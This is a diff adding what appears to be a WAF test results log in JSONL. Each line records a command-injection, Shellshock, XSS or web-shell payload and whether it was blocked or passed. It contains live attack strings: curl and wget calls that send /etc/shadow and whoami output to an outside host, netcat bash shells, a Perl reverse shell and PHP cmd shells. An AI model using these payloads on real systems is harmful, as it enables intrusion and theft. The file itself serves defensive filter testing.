@@ -1,0 +1,448 @@
+{"payload": "`", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.03025027499825228}
+{"payload": "||", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.019085281004663557}
+{"payload": "|", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01581528400129173}
+{"payload": ";", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.022427577001508325}
+{"payload": "'", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.026421625007060356}
+{"payload": "'\"", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016378347005229443}
+{"payload": "\"", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014490717003354803}
+{"payload": "\"'", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012867176003055647}
+{"payload": "&", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01574406700092368}
+{"payload": "&&", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016406228009145707}
+{"payload": "%0a", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014527202001772821}
+{"payload": "%0a%0d", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016356334002921358}
+{"payload": "%0Acat%20/etc/passwd", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005608773994026706}
+{"payload": "%0Aid", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015111878994503058}
+{"payload": "%0a id %0a", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012527206999948248}
+{"payload": "%0Aid%0A", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014049172998056747}
+{"payload": "%0a ping -i 30 127.0.0.1 %0a", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01527958401129581}
+{"payload": "%0A/usr/bin/id", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005535768999834545}
+{"payload": "%0A/usr/bin/id%0A", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005466878996230662}
+{"payload": "%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004683263003244065}
+{"payload": "%20{${phpinfo()}}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004180006988462992}
+{"payload": "%20{${sleep(20)}}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0049299269885523245}
+{"payload": "%20{${sleep(3)}}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006025740003678948}
+{"payload": "a|id|", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.019934409006964415}
+{"payload": "a;id|", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.030388063009013422}
+{"payload": "a;id;", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.02598977100569755}
+{"payload": "a;id\\n", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01408047899894882}
+{"payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\\`whoami\\`\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00443029600137379}
+{"payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\\`pwd\\`\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004549938006675802}
+{"payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\\`grep root /etc/shadow\\`\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005888330008019693}
+{"payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\\`uname -a\\`\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00528502999804914}
+{"payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\\`nc -lvvp 1234 -e /bin/bash\\`\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005867861007573083}
+{"payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\\`nc -lvvp 1236 -e /bin/bash &\\`\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006447405001381412}
+{"payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=5\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005271935006021522}
+{"payload": "() { :;}; /bin/bash -c \"sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0077373939857352525}
+{"payload": "() { :;}; /bin/bash -c \"sleep 1 && echo vulnerable 1\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007417148997774348}
+{"payload": "() { :;}; /bin/bash -c \"sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006877531995996833}
+{"payload": "() { :;}; /bin/bash -c \"sleep 3 && echo vulnerable 3\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006162456993479282}
+{"payload": "() { :;}; /bin/bash -c \"sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006225378994713537}
+{"payload": "() { :;}; /bin/bash -c \"sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007802690000971779}
+{"payload": "() { :;}; /bin/bash -c \"sleep 6 && echo vulnerable 6\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005334144007065333}
+{"payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\\`whoami\\`\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005347892001736909}
+{"payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\\`pwd\\`\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008627065006294288}
+{"payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\\`grep root /etc/shadow\\`\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007485490990802646}
+{"payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\\`uname -a\\`\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00542783600394614}
+{"payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\\`nc -lvvp 1235 -e /bin/bash\\`\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006298938998952508}
+{"payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\\`nc -lvvp 1237 -e /bin/bash &\\`\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008136721997288987}
+{"payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=4\"", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0065710579947335646}
+{"payload": "cat /etc/hosts", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006574008002644405}
+{"payload": "$(`cat /etc/passwd`)", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005184131994610652}
+{"payload": "cat /etc/passwd", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0070819149987073615}
+{"payload": "() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00512821800657548}
+{"payload": "| curl http://crowdshield.com/.testing/rce.txt", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005156824001460336}
+{"payload": "& curl http://crowdshield.com/.testing/rce.txt", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005348884005798027}
+{"payload": "; curl https://crowdshield.com/.testing/rce_vuln.txt", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006673449999652803}
+{"payload": "&& curl https://crowdshield.com/.testing/rce_vuln.txt", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006363052001688629}
+{"payload": "curl https://crowdshield.com/.testing/rce_vuln.txt", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004808693003724329}
+{"payload": "curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\\\" |curl https://crowdshield.com/.testing/rce_vuln.txt", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006347704998916015}
+{"payload": "curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\\\" |curl https://crowdshield.com/.testing/rce_vuln.txt", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0071667370066279545}
+{"payload": "$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006480908996309154}
+{"payload": "dir", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01234882400603965}
+{"payload": "| dir", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012970416006282903}
+{"payload": "; dir", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.020654952997574583}
+{"payload": "$(`dir`)", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00676098300027661}
+{"payload": "& dir", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016003351003746502}
+{"payload": "&&dir", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014338274006149732}
+{"payload": "&& dir", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015235660001053475}
+{"payload": "| dir C:\\", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005012467008782551}
+{"payload": "; dir C:\\", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005283165999571793}
+{"payload": "& dir C:\\", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005894642003113404}
+{"payload": "&& dir C:\\", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005495465011335909}
+{"payload": "dir C:\\", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015572888994938694}
+{"payload": "| dir C:\\Documents and Settings\\*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006619546009460464}
+{"payload": "; dir C:\\Documents and Settings\\*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006419530996936373}
+{"payload": "& dir C:\\Documents and Settings\\*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006108752990257926}
+{"payload": "&& dir C:\\Documents and Settings\\*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0065484340011607856}
+{"payload": "dir C:\\Documents and Settings\\*", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01769345998764038}
+{"payload": "| dir C:\\Users", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005608090999885462}
+{"payload": "; dir C:\\Users", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004724653001176193}
+{"payload": "& dir C:\\Users", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004863759997533634}
+{"payload": "&& dir C:\\Users", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006762841992895119}
+{"payload": "dir C:\\Users", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015675201007979922}
+{"payload": ";echo%20'<script>alert(1)</script>'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005228063993854448}
+{"payload": "echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004697094002040103}
+{"payload": "| echo \"<?php include($_GET['page'])| ?>\" > rfi.php", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0053299220016924664}
+{"payload": "; echo \"<?php include($_GET['page']); ?>\" > rfi.php", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005023917998187244}
+{"payload": "& echo \"<?php include($_GET['page']); ?>\" > rfi.php", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004582559005939402}
+{"payload": "&& echo \"<?php include($_GET['page']); ?>\" > rfi.php", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004433723996044137}
+{"payload": "echo \"<?php include($_GET['page']); ?>\" > rfi.php", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0052484190091490746}
+{"payload": "| echo \"<?php system('dir $_GET['dir']')| ?>\" > dir.php", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005266273990855552}
+{"payload": "; echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00404398501268588}
+{"payload": "& echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038865799870109186}
+{"payload": "&& echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004857048988924362}
+{"payload": "echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005217170008108951}
+{"payload": "| echo \"<?php system($_GET['cmd'])| ?>\" > cmd.php", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005224233012995683}
+{"payload": "; echo \"<?php system($_GET['cmd']); ?>\" > cmd.php", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005027897001127712}
+{"payload": "& echo \"<?php system($_GET['cmd']); ?>\" > cmd.php", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004897866994724609}
+{"payload": "&& echo \"<?php system($_GET['cmd']); ?>\" > cmd.php", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005603141995379701}
+{"payload": "echo \"<?php system($_GET['cmd']); ?>\" > cmd.php", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005850907997228205}
+{"payload": ";echo '<script>alert(1)</script>'", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004335905992775224}
+{"payload": "echo '<script>alert(1)</script>'// XXXXXXXXXXX", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004398324992507696}
+{"payload": "echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004477769005461596}
+{"payload": "| echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">;S\");open(STDOUT,\">;S\");open(STDERR,\">;S\");exec(\"/bin/sh -i\");};\" > rev.pl", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004661721002776176}
+{"payload": "; echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">;S\");open(STDOUT,\">;S\");open(STDERR,\">;S\");exec(\"/bin/sh -i\");};\" > rev.pl", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004597410006681457}
+{"payload": "& echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\" > rev.pl", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004853754988289438}
+{"payload": "&& echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\" > rev.pl", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006884892005473375}
+{"payload": "echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\" > rev.pl", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0058085570053663105}
+{"payload": "() { :;}; echo vulnerable 10", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004420709010446444}
+{"payload": "eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0051284489891259}
+{"payload": "eval('ls')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037818109994987026}
+{"payload": "eval('pwd')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0055006840120768175}
+{"payload": "eval('pwd');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006120232006651349}
+{"payload": "eval('sleep 5')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006572669997694902}
+{"payload": "eval('sleep 5');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004932994008413516}
+{"payload": "eval('whoami')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004459177012904547}
+{"payload": "eval('whoami');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004382212006021291}
+{"payload": "exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005125017007230781}
+{"payload": "exec('ls')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037527709937421605}
+{"payload": "exec('pwd')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004052520002005622}
+{"payload": "exec('pwd');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0043884470069315284}
+{"payload": "exec('sleep 5')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037807580083608627}
+{"payload": "exec('sleep 5');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003608116996474564}
+{"payload": "exec('whoami')", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033694969897624105}
+{"payload": "exec('whoami');", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004174134999630041}
+{"payload": ";{$_GET[\"cmd\"]}", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004337445003329776}
+{"payload": "`id`", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011741277005057782}
+{"payload": "|id", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015385488004540093}
+{"payload": "| id", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01619743499031756}
+{"payload": ";id", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01268951699603349}
+{"payload": ";id|", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011897332995431498}
+{"payload": ";id;", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.020791000992176123}
+{"payload": "& id", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.0169746129977284}
+{"payload": "&&id", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.017742438998539}
+{"payload": ";id\\n", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.018898231006460264}
+{"payload": "ifconfig", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.017244272006792016}
+{"payload": "| ifconfig", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0056932949955808}
+{"payload": "; ifconfig", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00667727600375656}
+{"payload": "& ifconfig", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005457731997012161}
+{"payload": "&& ifconfig", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008364330991753377}
+{"payload": "/index.html|id|", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.017884251006762497}
+{"payload": "ipconfig", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01667672001349274}
+{"payload": "| ipconfig /all", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005829807996633463}
+{"payload": "; ipconfig /all", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005042024000431411}
+{"payload": "& ipconfig /all", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004969909001374617}
+{"payload": "&& ipconfig /all", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004544170995359309}
+{"payload": "ipconfig /all", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015075201998115517}
+{"payload": "ls", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014202092992491089}
+{"payload": "$(`ls`)", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006211341009475291}
+{"payload": "| ls -l /", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007130949001293629}
+{"payload": "; ls -l /", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00616710601025261}
+{"payload": "& ls -l /", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006122821010649204}
+{"payload": "&& ls -l /", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008042190995183773}
+{"payload": "ls -l /", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005265202998998575}
